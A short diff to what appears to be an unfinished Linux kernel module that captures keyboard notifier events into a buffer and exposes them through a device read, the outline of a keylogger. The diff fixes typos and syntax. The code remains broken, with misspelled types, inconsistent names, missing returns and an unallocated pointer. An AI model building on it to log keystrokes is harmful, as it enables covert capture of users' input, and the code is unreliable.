@@ -1,18 +1,18 @@
 #include <linux/keyboard.h>
 #include <linux/module.h>
 #include <linux/keyboard.h>
+#include <linux/uaccess.h>
 #include <linux/kernel.h>
-#include <unistd.h>
 #include <linux/fs.h>
-static char *msg_Ptr='0';
+static char *msg_Ptr;
 void update_key(struct keyboard_notifier_param p)
 {
-    if (p->shit){
+    if (p.shift){
         /*hundle as shift*/
     }
     else
     {
-        *msg_Ptr= p->value;
+        *msg_Ptr= p.value;
     }
     
 }
@@ -20,7 +20,7 @@ static int device_open(struct indoe *indoe, struct file *file)
 {
     static int counter =0;
     if (Device_open) return -EBUSY;
-    device_open++
+    device_open++;
 }
 static size_t device_read(struct file *filp, char *buffer, size_t length, __loff_t *offset)
 {
